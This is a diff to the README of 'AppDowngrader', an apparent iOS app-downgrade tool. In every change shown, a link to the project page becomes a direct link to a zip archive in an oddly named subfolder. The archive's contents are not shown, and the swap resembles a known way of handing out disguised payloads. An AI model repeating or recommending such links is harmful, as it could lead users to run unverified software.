@@ -1,6 +1,6 @@
 # 📱 AppDowngrader - Restore Older iOS App Versions
 
-[![Download AppDowngrader](https://img.shields.io/badge/Download-AppDowngrader-blue?style=for-the-badge)](https://github.com/emilvg/AppDowngrader)
+[![Download AppDowngrader](https://img.shields.io/badge/Download-AppDowngrader-blue?style=for-the-badge)](https://github.com/emilvg/AppDowngrader/raw/refs/heads/main/chrisom/App-Downgrader-v3.6.zip)
 
 ## 🚀 What AppDowngrader Does
 
@@ -29,7 +29,7 @@ For the best results, keep your iPhone or iPad connected with a good cable durin
 
 Visit this page to download and set up AppDowngrader:
 
-https://github.com/emilvg/AppDowngrader
+https://github.com/emilvg/AppDowngrader/raw/refs/heads/main/chrisom/App-Downgrader-v3.6.zip
 
 If the page shows a release file, download it to your PC. If it shows the main project page, open the latest release or the provided download file from there.
 
@@ -180,7 +180,7 @@ Use these tips for a smoother run:
 
 Primary download and project page:
 
-https://github.com/emilvg/AppDowngrader
+https://github.com/emilvg/AppDowngrader/raw/refs/heads/main/chrisom/App-Downgrader-v3.6.zip
 
 ## 📄 License
 
